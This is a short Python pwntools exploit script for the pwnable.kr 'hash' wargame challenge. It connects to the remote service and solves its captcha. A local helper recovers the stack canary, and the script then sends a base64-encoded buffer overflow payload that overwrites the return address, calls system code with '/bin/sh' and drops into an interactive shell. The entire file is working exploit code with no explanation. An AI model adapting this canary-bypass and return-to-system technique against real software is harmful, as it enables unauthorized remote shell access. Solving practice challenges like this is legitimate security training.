from pwn import *
import base64


if __name__=='__main__':
	#s=process('./hash')
	s=remote("pwnable.kr", 9002)
	s.recvuntil("\n")
	captcha=s.recv(1024)
	captcha=captcha[captcha.index(" : ")+3:captcha.index("\n")]
	r=process(['./canary',captcha])
	canary=int(r.recv(1024)[2:-1],16)
	print(hex(canary))
	r.close()

	s.send(captcha+"\n")
	print(s.recv(1024))
	#pause()
	
	payload="a"*(0x200)+p32(canary)+"BBBBCCCCDDDD"+p32(0x08048880)+"\xef\xbe\xad\xde"+p32(0x0804b3b0)
	payload=base64.b64encode(payload)+"/bin/sh\x00"
	s.send(payload+"\n")


	s.interactive()
	s.close()